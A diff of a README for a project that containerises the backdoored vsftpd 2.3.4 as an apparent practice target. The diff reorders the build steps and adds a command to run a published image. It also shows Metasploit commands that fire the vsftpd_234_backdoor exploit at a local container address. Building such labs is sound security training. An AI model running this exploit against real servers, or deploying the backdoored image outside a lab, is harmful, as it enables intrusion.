@@ -11,13 +11,10 @@ However I did find another Github user's repo with the infected version: https:/
 
 Other changes are made to source to make it build with the Alpine C library in the Dockerfile during container image build.
 
-## Docker build & run
+## Use my published image from docker hub
 
 ```
-git clone https://github.com/clintmint/vsftpd-2.3.4-container.git
-cd vsftpd-2.3.4-container
-docker build -t <docker-hub-username>/vsftpd-2.3.4:1.0 . --no-cache
-docker run --name vsftpd-2.3.4 -it <docker-hub-username>/vsftpd-2.3.4:1.0 sh -c "start-vsftpd && sh"
+docker run --name vsftpd-2.3.4 -it clintmint/vsftpd-2.3.4:1.0 sh -c "start-vsftpd && sh"
 ```
 
 ## Exploiting with msf
@@ -28,6 +25,15 @@ use exploit/unix/ftp/vsftpd_234_backdooruse exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 172.17.0.2
 exploit
 ````
+
+## Docker build & run
+
+```
+git clone https://github.com/clintmint/vsftpd-2.3.4-container.git
+cd vsftpd-2.3.4-container
+docker build -t <docker-hub-username>/vsftpd-2.3.4:1.0 . --no-cache
+docker run --name vsftpd-2.3.4 -it <docker-hub-username>/vsftpd-2.3.4:1.0 sh -c "start-vsftpd && sh"
+```
 
 ## Multi-architecture build and push for linux/amd64 (Intel/AMD CPUs) and linux/arm64 (for Macs using M1 chip)
 
